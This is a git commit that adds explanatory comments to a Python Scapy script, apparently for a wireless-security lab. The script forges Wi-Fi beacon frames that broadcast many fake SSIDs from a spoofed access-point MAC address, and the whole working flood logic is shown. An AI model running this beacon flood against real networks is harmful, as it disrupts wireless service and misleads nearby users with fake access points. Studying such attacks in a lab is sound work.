8dd770d58efd9802b4f89bf770734b6ee6c5f96a
Jonathan Zaehringer <jonathan.zaehringer@gmail.com>
2020-03-05 13:18:12 +0100

    Comment flood script

--- flood_ssid.py
+++ flood_ssid.py
@@ -2,24 +2,29 @@
 # coding: utf-8
 
 # Beacon send source : https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+
 import sys
 from scapy.all import *
 
 list_ssid = []
 
-if len(sys.argv) < 2:
-    nbSSID = int(input("Specify number of fake uuid to generate"))
+if len(sys.argv) < 2: # Demand number of fake SSID
+    nbSSID = int(input("Specify number of fake SSID to generate"))
 
     for i in range(nbSSID):
         list_ssid.append(str(uuid.uuid4()))
-else:
+else: # Reading file spliting every '\n'
     f = open(sys.argv[1], 'r')
     list_ssid = f.read().splitlines()
 
+# Need to modify with your monitor interface name
 iface = "wlp0s20u1"
+
+# Can be change to choose MAC AP and the target
 ap = "12:34:56:78:90:ab"
 target = "ff:ff:ff:ff:ff:ff"
 
+# Create the fake Beacon
 beacon = Dot11(type=0, subtype=8, addr1=target, addr2=ap, addr3=ap) / Dot11Beacon(cap='ESS+privacy') / Dot11Elt(
     ID='RSNinfo', info=(
         '\x01\x00'  # RSN Version 1
@@ -32,10 +37,15 @@ beacon = Dot11(type=0, subtype=8, addr1=target, addr2=ap, addr3=ap) / Dot11Beaco
         '\x00\x00')  # RSN Capabilities (no extra capabilities)
     )
 
-for i in range(100):
+# Send 50 packets of each SSID
+for i in range(50):
     for i in range(len(list_ssid)):
+        # Generate part with the SSID
         essid = Dot11Elt(ID='SSID', info=list_ssid[i], len=len(list_ssid[i]))
-        packets = RadioTap() / beacon / essid
+        # Create the packet
+        packet = RadioTap() / beacon / essid
 
-        sendp(packets, iface=iface)
+        # SEND
+        sendp(packet, iface=iface)
+    # sleep a bit before rerun
     time.sleep(0.05)
